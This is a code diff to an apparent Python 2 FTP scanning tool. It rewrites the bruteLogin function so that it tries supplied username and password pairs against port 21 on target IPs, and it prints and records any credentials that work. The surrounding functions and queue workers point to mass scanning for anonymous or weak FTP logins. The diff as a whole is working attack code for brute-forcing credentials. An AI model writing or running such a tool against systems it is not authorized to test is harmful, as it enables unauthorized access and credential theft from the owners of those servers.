@@ -22,16 +22,15 @@ def anonLogin(ip, timeout):
             print ip, e
         else:
             pass
-        #print ip, e
         
 def bruteLogin(ip, user, pw, timeout):
     try:
         ftp = ftplib.FTP()
         ftp.connect(ip, 21, timeout)
-        email = binascii.b2a_hex(os.urandom(3)) + '@' + binascii.b2a_hex(os.urandom(3)) + '.com'
-        ftp.login('anonymous', email)
-        print "[*] " + str(ip) + ' : Anonymous FTP login succeeded!'
-        success = ip + "\n"
+        ftp.login(user, pw)
+        print "[*] %s: Brute force FTP login succeeded!" % (ip)
+        print "[*] Username: %s Password: %s\n" % (user, pw)
+        success = "IP: %s User: %s Pass: %s\n" % (ip, user, pw)
         ftp.quit()
         return success
     except Exception, e:
@@ -39,7 +38,6 @@ def bruteLogin(ip, user, pw, timeout):
             print ip, e
         else:
             pass
-        #print ip, e
 
 def anon_worker(ip_queue, found_queue, timeout):
     try:
